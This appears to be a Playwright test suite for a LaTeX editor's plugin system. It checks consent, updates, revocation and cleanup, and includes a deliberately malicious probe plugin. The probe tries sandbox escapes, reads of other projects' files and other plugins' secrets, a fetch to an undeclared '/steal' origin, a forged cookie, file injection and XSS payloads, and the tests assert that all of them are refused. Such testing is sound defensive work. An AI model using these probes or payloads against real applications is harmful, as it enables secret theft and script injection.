// The plugin system (docs/plugins.md) in all three engines: the Plugins manager and
// consent, enable/disable/revoke/update/rollback/uninstall with cleanup, and a malicious
// test plugin whose every attempt to leave its sandbox or scope is refused.
import {test,expect} from '@playwright/test';
import {mkdirSync} from 'node:fs';
import AxeBuilder from '@axe-core/playwright';
import {ZOTERO_ID,openProject,openManager,installZotero,storeRecords,pluginServer,pluginPackage,sideload,notice} from './plugin-helpers.js';
test.use({actionTimeout:15000});
test.setTimeout(180000);
const shots=process.env.SCRIBYRA_SCREENSHOTS;
const MAIN='\\documentclass{article}\n\\begin{document}\nHello.\n\\end{document}\n';
async function shoot(page,name,locator){
  if(!shots)return;mkdirSync(shots,{recursive:true});const engine=test.info().project.name;
  for(const theme of ['light','dark']){await page.evaluate(theme=>{document.documentElement.dataset.theme=theme;},theme);await page.waitForTimeout(150);await (locator||page).screenshot({path:`${shots}/${name}-${theme}-${engine}.png`});}
  await page.evaluate(()=>{document.documentElement.dataset.theme='light';});
}
const moreTools=async(page,name)=>{await page.getByRole('button',{name:'More tools'}).click();const item=page.locator('#more-tools-menu').getByRole('button',{name,exact:true});return item;};

test('nothing is fetched or run before the person installs; consent shows permissions; install, disable, enable and uninstall',async({page})=>{
  const errors=[],requests=[];page.on('pageerror',error=>errors.push(error.message));page.on('request',request=>requests.push(request.url()));
  await openProject(page,{'main.tex':MAIN});
  // No plugin runs and the registry was not requested: nothing installed, nothing browsed.
  expect(await page.locator('iframe.plugin-sandbox').count()).toBe(0);
  expect(requests.filter(url=>/scribyra-plugin[^/]*\.json|registry[^/]*\.json|^data:application\/json/.test(url))).toEqual([]);
  const manager=await openManager(page);
  await expect(manager).toContainText('No plugins are installed in this browser.');
  expect(requests.filter(url=>/scribyra-plugin[^/]*\.json|registry[^/]*\.json|^data:application\/json/.test(url))).toEqual([]);
  await shoot(page,'plugins-manager-empty',manager);
  await manager.getByRole('button',{name:'Browse official plugins'}).click();
  await expect(manager.getByRole('list',{name:'Official plugins'})).toContainText('Zotero');
  // Consent lists each permission in plain words; Cancel installs nothing.
  await manager.getByRole('button',{name:'Install Zotero'}).click();
  const consent=page.getByRole('dialog',{name:'Install Zotero?'});await expect(consent).toBeVisible();
  const permissions=consent.getByRole('list',{name:'Permissions'});
  await expect(permissions).toContainText('Read files in the open project matching *.bib, *.ltx and *.tex');
  await expect(permissions).toContainText('Create *.bib files and change the files it created');
  await expect(permissions).toContainText('Contact https://api.zotero.org');
  await expect(permissions).toContainText('Keep secrets such as API keys on this device');
  await expect(consent).toContainText('From the official Scribyra plugin registry. Its signature and checksum were verified.');
  await shoot(page,'plugins-consent',consent);
  const axeConsent=await new AxeBuilder({page}).include('.plugin-consent').analyze();expect(axeConsent.violations.map(v=>v.id)).toEqual([]);
  await consent.getByRole('button',{name:'Cancel'}).click();
  await expect(manager.getByRole('status')).toHaveText('Nothing was installed.');
  expect(await storeRecords(page,'scribyra-plugins','plugins')).toEqual([]);
  await manager.getByRole('button',{name:'Install Zotero'}).click();await consent.getByRole('button',{name:'Install',exact:true}).click();
  await expect(manager.getByRole('status')).toContainText('Zotero 1.0.0 installed and enabled.');
  const card=manager.locator(`[data-plugin="${ZOTERO_ID}"]`);
  await expect(card.getByRole('switch',{name:'Enable Zotero'})).toBeChecked();
  await expect(card).toContainText('Official');
  await expect(page.locator(`iframe.plugin-sandbox[data-plugin="${ZOTERO_ID}"]`)).toHaveCount(1);
  await shoot(page,'plugins-manager',manager);
  const axe=await new AxeBuilder({page}).include('.plugin-manager').analyze();expect(axe.violations.map(v=>v.id)).toEqual([]);
  await manager.getByRole('button',{name:'Close',exact:true}).click();
  // Its command appears in More tools, and its tree action on the root.
  await expect(await moreTools(page,'Zotero')).toBeVisible();await page.keyboard.press('Escape');
  await page.locator('.tree-root').click({button:'right'});await expect(page.getByRole('menuitem',{name:/^Link to Zotero/})).toBeEnabled();await page.keyboard.press('Escape');
  // Disable: the sandbox goes and so do its contributions; enable brings them back.
  await openManager(page);await card.getByRole('switch',{name:'Enable Zotero'}).uncheck();
  await expect(manager.getByRole('status')).toHaveText('Zotero is disabled.');
  await expect(page.locator('iframe.plugin-sandbox')).toHaveCount(0);
  await manager.getByRole('button',{name:'Close',exact:true}).click();
  await expect(await moreTools(page,'Zotero')).toHaveCount(0);await page.keyboard.press('Escape');
  await page.locator('.tree-root').click({button:'right'});await expect(page.getByRole('menuitem',{name:/^Link to Zotero/})).toHaveCount(0);await page.keyboard.press('Escape');
  await openManager(page);await card.getByRole('switch',{name:'Enable Zotero'}).check();await expect(manager.getByRole('status')).toHaveText('Zotero is enabled.');
  await expect(page.locator(`iframe.plugin-sandbox[data-plugin="${ZOTERO_ID}"]`)).toHaveCount(1);
  // Reload: installed plugins persist and start again with the project.
  await manager.getByRole('button',{name:'Close',exact:true}).click();
  await expect(page.locator('.save-indicator')).toHaveText('Saved locally');await page.reload();await page.locator('.card-open').first().click();await expect(page.locator('.cm-content')).toBeVisible();
  await expect(page.locator(`iframe.plugin-sandbox[data-plugin="${ZOTERO_ID}"]`)).toHaveCount(1);
  // Uninstall asks, then removes the plugin, its package and all its data.
  await openManager(page);await card.getByRole('button',{name:'Uninstall Zotero'}).click();
  await page.getByRole('dialog',{name:'Uninstall Zotero'}).getByRole('button',{name:'Uninstall'}).click();
  await expect(manager.getByRole('status')).toContainText('Zotero was uninstalled and its data and secrets were removed from this device.');
  await expect(page.locator('iframe.plugin-sandbox')).toHaveCount(0);
  for(const store of ['plugins','packages','data','owned'])expect(await storeRecords(page,'scribyra-plugins',store),store).toEqual([]);
  expect(await storeRecords(page,'scribyra-plugin-secrets','secrets')).toEqual([]);
  expect(errors).toEqual([]);
});

// A plugin that tries every way out of its sandbox and scope, then reports what happened
// to the test server through the one origin it may contact.
function probeCode(config){
  return `const config=${JSON.stringify(config)};
const attempt=async(fn)=>{try{return {ok:true,value:await fn()};}catch(error){return {ok:false,code:error.code||error.name,message:String(error.message).slice(0,300)};}};
const report=body=>scribyra.call('net.fetch',{url:config.origin+'/report',method:'POST',headers:[['Content-Type','application/json']],body:JSON.stringify(body)});
let early=null;
scribyra.on('project.opened',async()=>{early={dialogWithoutUse:await attempt(()=>scribyra.call('ui.dialog.open',{spec:{title:'Sign in to Scribyra',children:[{type:'actions',buttons:[{id:'ok',label:'OK'}]}]}})),activateWithoutUse:await attempt(()=>scribyra.call('project.activate',{fileId:config.refsId}))};});
scribyra.handle('command.run',async({command})=>{
  const r={};
  if(command==='probe'){
    r.early=early;
    r.globals={fetch:typeof fetch,XMLHttpRequest:typeof XMLHttpRequest,WebSocket:typeof WebSocket,EventSource:typeof EventSource,importScripts:typeof importScripts,indexedDB:typeof indexedDB,caches:typeof caches,Worker:typeof Worker,SharedWorker:typeof SharedWorker,BroadcastChannel:typeof BroadcastChannel,document:typeof document,window:typeof window,parent:typeof parent,localStorage:typeof localStorage,RTCPeerConnection:typeof RTCPeerConnection,origin:self.origin};
    r.protoFetch=await attempt(()=>{for(let o=self;o;o=Object.getPrototypeOf(o)){const d=Object.getOwnPropertyDescriptor(o,'fetch');if(d&&d.value)return 'found';}return 'none';});
    r.eval=await attempt(()=>(0,eval)('1+1'));
    r.newFunction=await attempt(()=>new Function('return 2')());
    r.blobImport=await attempt(()=>{const url=URL.createObjectURL(new Blob(['self.x=1'],{type:'text/javascript'}));self.importScripts?.(url);return typeof self.importScripts;});
    r.files=await attempt(()=>scribyra.call('project.files'));
    r.readOtherProject=await attempt(()=>scribyra.call('project.read',{fileId:config.otherFileId}));
    r.readOutsideGlobs=await attempt(()=>scribyra.call('project.read',{fileId:config.mainId}));
    r.zoteroKey=await attempt(()=>scribyra.call('secrets.get',{name:'key-4242'}));
    r.secretNames=await attempt(()=>scribyra.call('secrets.keys'));
    r.zoteroAccounts=await attempt(()=>scribyra.call('storage.get',{key:'accounts'}));
    r.zoteroLinks=await attempt(()=>scribyra.call('projectData.keys'));
    r.fetchZotero=await attempt(()=>scribyra.call('net.fetch',{url:'https://api.zotero.org/keys/current'}));
    r.fetchOtherPort=await attempt(()=>scribyra.call('net.fetch',{url:config.otherOrigin+'/steal'}));
    r.fetchWithUser=await attempt(()=>scribyra.call('net.fetch',{url:config.origin.replace('http://','http://user:pw@')+'/x'}));
    r.fetchApp=await attempt(()=>scribyra.call('net.fetch',{url:config.appOrigin+'/'}));
    r.cookieProbe=await attempt(()=>scribyra.call('net.fetch',{url:config.origin+'/cookie',headers:[['Cookie','stolen=1'],['X-Probe','1']]}));
    r.createOutside=await attempt(()=>scribyra.call('project.create',{path:'evil.tex',content:'\\\\input{x}'}));
    r.patchUnowned=await attempt(()=>scribyra.call('project.patch',{fileId:config.refsId,edits:[{start:0,end:0,before:'',after:'% injected\\n'}]}));
    r.patchMain=await attempt(()=>scribyra.call('project.patch',{fileId:config.mainId,edits:[{start:0,end:0,before:'',after:'% injected\\n'}]}));
    r.decorateUnreadable=await attempt(()=>scribyra.call('ui.files.decorate',{fileId:config.mainId,tags:['x'],bar:null}));
    r.pickWithoutPermission=await attempt(()=>scribyra.call('project.pick',{title:'Pick',files:['*']}));
    r.unknownMethod=await attempt(()=>scribyra.call('project.export'));
    r.agentMethod=await attempt(()=>scribyra.call('agent.patchSource',{edits:[]}));
    r.htmlDialog=await attempt(()=>scribyra.call('ui.dialog.open',{spec:{title:'x',children:[{type:'html',html:'<img src=x onerror=alert(1)>'}]}}));
    r.httpLink=await attempt(()=>scribyra.call('ui.dialog.open',{spec:{title:'x',children:[{type:'link',href:'javascript:alert(1)',text:'x'},{type:'actions',buttons:[{id:'ok',label:'OK'}]}]}}));
    r.createOwn=await attempt(()=>scribyra.call('project.create',{path:'probe.bib',content:'% probe\\n'}));
    if(r.createOwn.ok)r.patchOwn=await attempt(()=>scribyra.call('project.patch',{fileId:r.createOwn.value.id,edits:[{start:0,end:0,before:'',after:'% edited by probe\\n'}]}));
    r.storeSecret=await attempt(()=>scribyra.call('secrets.set',{name:'token',value:'probe-secret-value'}));
    r.storeData=await attempt(()=>scribyra.call('projectData.set',{key:'state',value:{n:1}}));
    r.storeSetting=await attempt(()=>scribyra.call('storage.set',{key:'setting',value:'probe-setting'}));
  }
  if(command==='write'){
    const files=await scribyra.call('project.files'),own=files.find(file=>file.path==='probe.bib');
    r.context=await scribyra.call('app.context');
    r.create=await attempt(()=>scribyra.call('project.create',{path:'probe-'+r.context.mode+'.bib',content:'% x\\n'}));
    r.patch=await attempt(async()=>{const text=(await scribyra.call('project.read',{fileId:own.id})).text;return scribyra.call('project.patch',{fileId:own.id,edits:[{start:text.length,end:text.length,before:'',after:'% '+r.context.mode+'\\n'}]});});
  }
  if(command==='suggest'){r.bibliography=await attempt(()=>scribyra.call('bibliography.set',{entries:[{key:'probe2026',author:'Probe',year:'2026',title:'A probing study'}]}));r.completion=await attempt(()=>scribyra.call('completion.set',{items:[{kind:'command',name:'probecommand',args:1}]}));}
  await report({command,version:scribyra.plugin.version,...r});
  return {};
});`;
}
const PROBE_ID='org.example.probe';
function probeManifest(server,version='1.0.0',extra={}){
  return {id:PROBE_ID,name:'Probe',version,description:'A test plugin that tries to leave its sandbox.',
    permissions:{'project.read':{files:['*.bib']},'project.write':{create:['*.bib']},network:[server.origin],secrets:true,'ui.dialog':true,'ui.command':true,...extra},
    contributes:{commands:[{id:'probe',label:'Run probe'},{id:'write',label:'Probe write'},{id:'suggest',label:'Probe suggest'}]}};
}
async function runProbe(page,server,command){
  const count=server.reports.length;
  await page.evaluate(value=>window.scribyra.action('plugin-command',value),`${PROBE_ID}:${command}`);
  return server.nextReport(count+1);
}

test('a malicious plugin cannot leave its sandbox: no app storage, DOM, cookies, other projects or plugins, undeclared hosts, or writes outside its scope',async({page,context})=>{
  const server=await pluginServer(),other=await pluginServer(),errors=[];page.on('pageerror',error=>errors.push(error.message));
  try{
    // Another project with a secret, whose file id the probe is given.
    await openProject(page,{'secret.bib':'@misc{secret, title={Other project secret}}\n'},'other-project.zip');
    const otherFileId=await page.evaluate(()=>window.scribyra.agent.readTree({}).value.items.find(item=>item.path==='secret.bib').id);
    await openProject(page,{'main.tex':MAIN,'refs.bib':'@book{knuth, title={TAOCP}}\n'});
    await page.evaluate(()=>{document.cookie='scribyra_session=cookie-secret; path=/';});
    const ids=await page.evaluate(()=>Object.fromEntries(window.scribyra.agent.readTree({}).value.items.map(item=>[item.path,item.id])));
    // Zotero holds a key the probe will look for.
    await installZotero(page);
    await page.evaluate(async()=>{});
    const config={origin:server.origin,otherOrigin:other.origin,appOrigin:new URL(page.url()).origin,otherFileId,mainId:ids['main.tex'],refsId:ids['refs.bib']};
    const url=server.serve('/probe-1.0.0.scribyra-plugin.json',pluginPackage(probeManifest(server),probeCode(config)));
    const manager=await openManager(page);
    const consent=await sideload(page,url,{consentName:'Install Probe?',accept:false});
    await expect(manager.getByRole('status')).toHaveText('Nothing was installed.');
    await sideload(page,url,{consentName:'Install Probe?'});
    await expect(manager.getByRole('status')).toContainText('Probe 1.0.0 installed and enabled.');
    await expect(manager.locator(`[data-plugin="${PROBE_ID}"]`)).toContainText('Developer');
    await shoot(page,'plugins-manager-developer',manager);
    void consent;
    await manager.getByRole('button',{name:'Close',exact:true}).click();
    const r=await runProbe(page,server,'probe');
    // The sandbox: an opaque origin, no DOM, no storage, no network APIs.
    expect(r.globals).toEqual({fetch:'undefined',XMLHttpRequest:'undefined',WebSocket:'undefined',EventSource:'undefined',importScripts:'undefined',indexedDB:'undefined',caches:'undefined',Worker:'undefined',SharedWorker:'undefined',BroadcastChannel:'undefined',document:'undefined',window:'undefined',parent:'undefined',localStorage:'undefined',RTCPeerConnection:'undefined',origin:'null'});
    expect(r.protoFetch.value).toBe('none');
    expect(r.eval.ok).toBe(false);expect(r.newFunction.ok).toBe(false);
    // Only files matching its globs, only in the open project.
    expect(r.files.value.map(file=>file.path)).toEqual(['refs.bib']);
    expect(r.readOtherProject).toMatchObject({ok:false,code:'not_found'});
    expect(r.readOutsideGlobs).toMatchObject({ok:false,code:'not_found'});
    // Another plugin's key, settings and links are invisible: its own namespaces are empty.
    expect(r.zoteroKey).toEqual({ok:true,value:null});expect(r.secretNames).toEqual({ok:true,value:[]});
    expect(r.zoteroAccounts).toEqual({ok:true,value:null});expect(r.zoteroLinks).toEqual({ok:true,value:[]});
    // Only the declared origin; no credentials, cookies or redirects.
    for(const name of ['fetchZotero','fetchOtherPort','fetchWithUser','fetchApp'])expect(r[name],name).toMatchObject({ok:false,code:'network_denied'});
    expect(other.requests).toEqual([]);
    expect(r.cookieProbe.ok).toBe(true);
    const cookieRequest=server.requests.find(request=>request.url==='/cookie');expect(cookieRequest.cookie).toBeNull();expect(cookieRequest.referer).toBeNull();
    // Writes only to files it created; never to files it merely reads or cannot see.
    expect(r.createOutside).toMatchObject({ok:false,code:'permission_denied'});
    expect(r.patchUnowned).toMatchObject({ok:false,code:'permission_denied'});
    expect(r.patchMain).toMatchObject({ok:false,code:'not_found'});
    expect(r.decorateUnreadable).toMatchObject({ok:false,code:'permission_denied'});
    expect(r.pickWithoutPermission).toMatchObject({ok:false,code:'permission_denied'});
    expect(r.unknownMethod).toMatchObject({ok:false,code:'unknown_method'});expect(r.agentMethod).toMatchObject({ok:false,code:'unknown_method'});
    expect(r.htmlDialog).toMatchObject({ok:false,code:'invalid_dialog'});expect(r.httpLink).toMatchObject({ok:false,code:'invalid_dialog'});
    // Dialogs and file switching only while the person is using it.
    expect(r.early.dialogWithoutUse).toMatchObject({ok:false,code:'not_allowed'});expect(r.early.activateWithoutUse).toMatchObject({ok:false,code:'not_allowed'});
    expect(r.createOwn.ok).toBe(true);expect(r.patchOwn).toMatchObject({ok:true,value:{applied:1}});
    const source=path=>page.evaluate(path=>window.scribyra.agent.readSource({path,startLine:1,endLine:50}).value?.content??null,path);
    expect(await source('probe.bib')).toBe('% edited by probe\n% probe\n');
    expect(await source('refs.bib')).toBe('@book{knuth, title={TAOCP}}\n');expect(await source('main.tex')).toBe(MAIN);expect(await source('evil.tex')).toBeNull();
    // The report itself went only to the declared origin, and nothing reached the other one.
    expect(server.requests.every(request=>['/probe-1.0.0.scribyra-plugin.json','/report','/cookie'].includes(request.url)||request.method==='OPTIONS')).toBe(true);

    // The same holds one layer down: the sandbox frame itself has an opaque origin and a deny-all CSP.
    const frame=page.frames().find(item=>item!==page.mainFrame()&&item.url()==='about:srcdoc'&&item.parentFrame()===page.mainFrame());
    expect(frame).toBeTruthy();
    const layer=await frame.evaluate(async origin=>{
      const out={origin:self.origin};
      try{indexedDB.open('scribyra-v1');out.idb='opened';}catch(error){out.idb=error.name;}
      try{out.cookie=document.cookie;}catch(error){out.cookie=error.name;}
      try{out.parentDom=parent.document.title;}catch(error){out.parentDom=error.name;}
      try{await fetch(origin+'/frame');out.fetch='ok';}catch{out.fetch='blocked';}
      return out;
    },server.origin);
    // The page's cookie is unreadable: Chromium and Firefox throw, WebKit answers with no cookies.
    expect(['SecurityError','']).toContain(layer.cookie);expect(layer.cookie).not.toContain('cookie-secret');
    expect({...layer,cookie:undefined}).toEqual({origin:'null',idb:'SecurityError',cookie:undefined,parentDom:'SecurityError',fetch:'blocked'});
    expect(server.requests.some(request=>request.url==='/frame')).toBe(false);

    // Modes: Viewing refuses every write; Reviewing turns changes into suggestions credited to the plugin.
    await page.getByRole('combobox',{name:'Editor mode'}).selectOption('viewing');
    let w=await runProbe(page,server,'write');
    expect(w.context.mode).toBe('viewing');expect(w.create).toMatchObject({ok:false,code:'viewing_mode'});expect(w.patch).toMatchObject({ok:false,code:'viewing_mode'});
    await page.getByRole('combobox',{name:'Editor mode'}).selectOption('reviewing');
    w=await runProbe(page,server,'write');
    expect(w.create).toMatchObject({ok:false,code:'reviewing_mode'});expect(w.patch).toMatchObject({ok:true,value:{suggested:1}});
    expect(await source('probe.bib')).toBe('% edited by probe\n% probe\n');
    const suggestion=await page.evaluate(()=>{const raw=[...document.querySelectorAll('*')].map(node=>node.textContent).find(text=>text?.includes('Probe (plugin)'));return !!raw;});
    expect(suggestion).toBe(true);
    await page.getByRole('combobox',{name:'Editor mode'}).selectOption('editing');
    w=await runProbe(page,server,'write');expect(w.create.ok).toBe(true);expect(w.patch).toMatchObject({ok:true,value:{applied:1}});
    expect(errors).toEqual([]);
  }finally{await server.close();await other.close();}
});

test('updates ask again only for new permissions; rollback, revoke, developer mode off, reserved ids and uninstall cleanup',async({page})=>{
  const server=await pluginServer(),errors=[];page.on('pageerror',error=>errors.push(error.message));
  try{
    await openProject(page,{'main.tex':MAIN,'refs.bib':'@book{knuth, title={TAOCP}}\n'});
    const ids=await page.evaluate(()=>Object.fromEntries(window.scribyra.agent.readTree({}).value.items.map(item=>[item.path,item.id])));
    const config={origin:server.origin,otherOrigin:server.origin,appOrigin:new URL(page.url()).origin,otherFileId:'none',mainId:ids['main.tex'],refsId:ids['refs.bib']};
    const v1=server.serve('/probe-1.0.0.scribyra-plugin.json',pluginPackage(probeManifest(server),probeCode(config)));
    const v11=server.serve('/probe-1.1.0.scribyra-plugin.json',pluginPackage(probeManifest(server,'1.1.0'),probeCode(config)));
    const v2=server.serve('/probe-2.0.0.scribyra-plugin.json',pluginPackage(probeManifest(server,'2.0.0',{bibliography:true,completion:true}),probeCode(config)));
    const manager=await openManager(page);
    // A sideloaded package may not claim an official id.
    const fake=server.serve('/fake.scribyra-plugin.json',pluginPackage({...probeManifest(server),id:'com.scribyra.zotero',name:'Zotero'},'/* fake */'));
    await manager.getByRole('switch',{name:'Developer mode'}).check();
    await manager.getByLabel('Plugin package URL').fill(fake);await manager.getByRole('button',{name:'Install from URL'}).click();
    await expect(manager.getByRole('status')).toContainText('belong to the official registry');
    await sideload(page,v1,{consentName:'Install Probe?'});await expect(manager.getByRole('status')).toContainText('Probe 1.0.0 installed and enabled.');
    await manager.getByRole('button',{name:'Close',exact:true}).click();
    const r=await runProbe(page,server,'probe');expect(r.storeSecret.ok&&r.storeData.ok&&r.storeSetting.ok).toBe(true);
    // An update with the same permissions asks once, saying nothing is new.
    await openManager(page);
    let consent=await sideload(page,v11,{consentName:'Update Probe to 1.1.0?',accept:null});
    await expect(consent).toContainText('It asks for nothing new.');await expect(consent.getByRole('list',{name:'New permissions'})).toHaveCount(0);
    await consent.getByRole('button',{name:'Update'}).click();await expect(manager.getByRole('status')).toContainText('Probe updated to 1.1.0.');
    // An update that adds permissions lists only those.
    consent=await sideload(page,v2,{consentName:'Update Probe to 2.0.0?',accept:null});
    await expect(consent).toContainText('This version asks for more:');
    await expect(consent.getByRole('list',{name:'New permissions'}).getByRole('listitem')).toHaveText([/Suggest citations while you type/,/Suggest LaTeX commands while you type/]);
    await consent.getByRole('button',{name:'Update'}).click();await expect(manager.getByRole('status')).toContainText('Probe updated to 2.0.0.');
    const card=manager.locator(`[data-plugin="${PROBE_ID}"]`);await expect(card).toContainText('2.0.0');
    await manager.getByRole('button',{name:'Close',exact:true}).click();
    // Its contributions reach \cite{ and command completion, labelled with the plugin.
    expect(await runProbe(page,server,'suggest')).toMatchObject({version:'2.0.0',bibliography:{ok:true},completion:{ok:true}});
    await page.getByRole('treeitem',{name:'main.tex',exact:true}).click();await page.locator('.cm-content').click();await page.keyboard.press('Control+End');
    await page.keyboard.type('\\cite{probe',{delay:30});
    await expect(page.locator('.cm-tooltip-autocomplete').getByRole('option').filter({hasText:'probe2026'})).toContainText('Probe plugin');
    await page.keyboard.press('Escape');
    // Revoke: the next call is refused and the plugin restarts without it.
    await openManager(page);
    await card.getByRole('button',{name:'Revoke: Suggest citations while you type'}).click();
    await expect(manager.getByRole('status')).toContainText('Probe can no longer: suggest citations while you type.');
    await expect(card.locator('[data-permission="bibliography"]')).toHaveAttribute('data-granted','false');
    await manager.getByRole('button',{name:'Close',exact:true}).click();
    expect((await runProbe(page,server,'suggest')).bibliography).toMatchObject({ok:false,code:'permission_denied'});
    // Granting again asks for consent for that permission only.
    await openManager(page);await card.getByRole('button',{name:'Grant again: Suggest citations while you type'}).click();
    consent=page.getByRole('dialog',{name:'Allow Probe again?'});await expect(consent.getByRole('list',{name:'New permissions'}).getByRole('listitem')).toHaveText([/Suggest citations while you type/]);
    await consent.getByRole('button',{name:'Allow'}).click();await expect(manager.getByRole('status')).toContainText('Probe can again: suggest citations while you type.');
    // Rollback restores the previous version and its permissions.
    await card.getByRole('button',{name:'Roll back to 1.1.0'}).click();await expect(manager.getByRole('status')).toContainText('Probe rolled back to 1.1.0.');
    await expect(card.locator('[data-permission="bibliography"]')).toHaveCount(0);
    await manager.getByRole('button',{name:'Close',exact:true}).click();
    expect((await runProbe(page,server,'suggest')).bibliography).toMatchObject({ok:false,code:'permission_denied'});
    // Developer mode off: plugins from a URL stop and say why.
    await openManager(page);await manager.getByRole('switch',{name:'Developer mode'}).uncheck();
    await expect(manager.getByRole('status')).toContainText('Developer mode is off.');
    await expect(page.locator(`iframe.plugin-sandbox[data-plugin="${PROBE_ID}"]`)).toHaveCount(0);
    await expect(card).toContainText('Turn on developer mode to run plugins installed from a URL.');
    await manager.getByRole('switch',{name:'Developer mode'}).check();await expect(page.locator(`iframe.plugin-sandbox[data-plugin="${PROBE_ID}"]`)).toHaveCount(1);
    // Uninstall removes everything it kept, including its secret; its file stays as an ordinary file.
    await card.getByRole('button',{name:'Uninstall Probe'}).click();
    await page.getByRole('dialog',{name:'Uninstall Probe'}).getByRole('button',{name:'Uninstall'}).click();
    await expect(manager.getByRole('status')).toContainText('Probe was uninstalled');
    for(const store of ['plugins','packages','data','owned'])expect(await storeRecords(page,'scribyra-plugins',store),store).toEqual([]);
    expect(await storeRecords(page,'scribyra-plugin-secrets','secrets')).toEqual([]);
    expect(await page.evaluate(()=>window.scribyra.agent.readSource({path:'probe.bib',startLine:1,endLine:5}).value?.content)).toContain('% probe');
    expect(errors).toEqual([]);
  }finally{await server.close();}
});

test.describe('without the service worker, so the test can alter a bundled asset',()=>{
test.use({serviceWorkers:'block'});
test('a tampered official package is refused before consent',async({page})=>{
  await openProject(page,{'main.tex':MAIN});
  await page.route(/scribyra-plugin-[^/]*\.json$/,async route=>{const response=await route.fetch();const text=(await response.text()).replace('Zotero','Zotera');await route.fulfill({response,body:text});});
  const manager=await openManager(page);
  await manager.getByRole('button',{name:'Browse official plugins'}).click();await manager.getByRole('button',{name:'Install Zotero'}).click();
  await expect(manager.getByRole('status')).toContainText('does not match the registry');
  await expect(page.getByRole('dialog',{name:'Install Zotero?'})).toHaveCount(0);
  expect(await storeRecords(page,'scribyra-plugins','plugins')).toEqual([]);
});
});
